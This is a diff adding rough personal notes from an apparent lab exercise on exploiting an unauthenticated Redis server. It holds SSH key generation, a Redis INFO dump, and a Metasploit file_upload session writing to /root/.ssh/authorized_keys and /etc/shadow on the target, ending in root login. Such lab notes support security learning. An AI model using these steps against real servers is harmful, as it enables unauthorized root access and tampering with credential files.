@@ -1,0 +1,209 @@
+REDIS
+redis
+
+command list
+
+http://redis.io/commands
+http://blaszczakm.blogspot.com/2016/03/kevgir-vm-writeup.html
+http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/  <-- detailed
+
+--------------------------------------
+
+Commands I used, and work from ~ directory
+
+ssh-keygen -t rsa
+
+* You will be asked
+
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+/root/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+
+*******When you are asked the above I just hit enter to get all defaults -- then I get the following output
+
+
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:j2G4Ol5LoJR9bgy808TvXz8W56KVp/o/leF9uWcKl3c root@kali
+
+***Now I enter
+
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > /root/Desktop/foo.txt  <--this will output 
+
+the keygen to the desktop
+
+to be continued
+
+---------------------------------
+
+ 
+
+
+
+
+
+4) redis hacking
+root@kali:~# redis-cli -h 10.0.1.3
+10.0.1.3:6379> INFO
+# Server
+redis_version:3.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:aa70bcb321ba8313
+redis_mode:standalone
+os:Linux 3.19.0-25-generic i686
+arch_bits:32
+multiplexing_api:epoll
+gcc_version:4.8.4
+process_id:1215
+run_id:f77a1654a20f1a67cadbe83761f0bd907ce01e0e
+tcp_port:6379
+uptime_in_seconds:4070
+uptime_in_days:0
+hz:10
+lru_clock:15370196
+config_file:/etc/redis/6379.conf
+
+# Clients
+connected_clients:2
+client_longest_output_list:0
+client_biggest_input_buf:0
+blocked_clients:0
+
+# Memory
+used_memory:659136
+used_memory_human:643.69K
+used_memory_rss:9306112
+used_memory_peak:687064
+used_memory_peak_human:670.96K
+used_memory_lua:24576
+mem_fragmentation_ratio:14.12
+mem_allocator:jemalloc-3.6.0
+
+# Persistence
+loading:0
+rdb_changes_since_last_save:1
+rdb_bgsave_in_progress:0
+rdb_last_save_time:1458210485
+rdb_last_bgsave_status:ok
+rdb_last_bgsave_time_sec:0
+rdb_current_bgsave_time_sec:-1
+aof_enabled:0
+aof_rewrite_in_progress:0
+aof_rewrite_scheduled:0
+aof_last_rewrite_time_sec:-1
+aof_current_rewrite_time_sec:-1
+aof_last_bgrewrite_status:ok
+aof_last_write_status:ok
+
+# Stats
+total_connections_received:21
+total_commands_processed:74
+instantaneous_ops_per_sec:0
+total_net_input_bytes:6574
+total_net_output_bytes:22122
+instantaneous_input_kbps:0.00
+instantaneous_output_kbps:0.00
+rejected_connections:0
+sync_full:0
+sync_partial_ok:0
+sync_partial_err:0
+expired_keys:0
+evicted_keys:0
+keyspace_hits:0
+keyspace_misses:0
+pubsub_channels:0
+pubsub_patterns:0
+latest_fork_usec:14331
+migrate_cached_sockets:0
+
+# Replication
+role:master
+connected_slaves:0
+master_repl_offset:0
+repl_backlog_active:0
+repl_backlog_size:1048576
+repl_backlog_first_byte_offset:0
+repl_backlog_histlen:0
+
+# CPU
+used_cpu_sys:34.07
+used_cpu_user:0.28
+used_cpu_sys_children:0.02
+used_cpu_user_children:0.00
+
+# Cluster
+cluster_enabled:0
+
+# Keyspace
+db0:keys=2,expires=0,avg_ttl=0
+10.0.1.3:6379>
+
+
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt/.ssh"
+
+Module options (auxiliary/scanner/redis/file_upload):
+
+   Name                    Current Setting  Required  Description
+   ----                    ---------------  --------  -----------
+   DISABLE_RDBCOMPRESSION  true             yes       Disable compression when saving if found to be enabled
+   LocalFile                                no        Local file to be uploaded
+   Password                foobared         no        Redis password for authentication test
+   RHOSTS                                   yes       The target address range or CIDR identifier
+   RPORT                   6379             yes       The target port
+   RemoteFile                               no        Remote file path
+   THREADS                 1                yes       The number of concurrent threads
+
+msf auxiliary(file_upload) > set RHOSTS 10.0.1.3
+RHOSTS => 10.0.1.3
+msf auxiliary(file_upload) > exploit
+
+[-] Auxiliary failed: RuntimeError bad-config: LocalFile must be set
+[-] Call stack:
+[-]   /usr/share/metasploit-framework/lib/msf/core/module.rb:291:in `fail_with'
+[-]   /usr/share/metasploit-framework/modules/auxiliary/scanner/redis/file_upload.rb:150:in `run_host'
+[-]   /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:121:in `block (2 levels) in run'
+[-]   /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
+[*] Auxiliary module execution completed
+msf auxiliary(file_upload) > set LocalFile /root/.ssh/foo.txt
+LocalFile => /root/.ssh/foo.txt
+msf auxiliary(file_upload) > set RemoteFile /root/.ssh/authorized_keys
+RemoteFile => /root/.ssh/authorized_keys
+msf auxiliary(file_upload) > exploit
+
+[-] 10.0.1.3:6379         - 10.0.1.3:6379         -- failed to save 392 bytes to /root/.ssh/authorized_keys (permissions?)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(file_upload) > set RemoteFile /root/.ssh/id_rsa
+RemoteFile => /root/.ssh/id_rsa
+msf auxiliary(file_upload) > exploit
+
+[+] 10.0.1.3:6379         - 10.0.1.3:6379         -- saved 392 bytes inside of redis DB at /root/.ssh/id_rsa
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(file_upload) > set RemoteFile /etc/shadow
+RemoteFile => /etc/shadow
+msf auxiliary(file_upload) > exploit
+
+[+] 10.0.1.3:6379         - 10.0.1.3:6379         -- saved 392 bytes inside of redis DB at /etc/shadow
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(file_upload) > set LocalFile /etc/shadow
+LocalFile => /etc/shadow
+msf auxiliary(file_upload) > set RemoteFile /etc/shadow
+RemoteFile => /etc/shadow
+msf auxiliary(file_upload) > exploit
+
+[+] 10.0.1.3:6379         - 10.0.1.3:6379         -- saved 1664 bytes inside of redis DB at /etc/shadow
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(file_upload) >
+
+
+DONE
+ i logged in to VM on root.
+
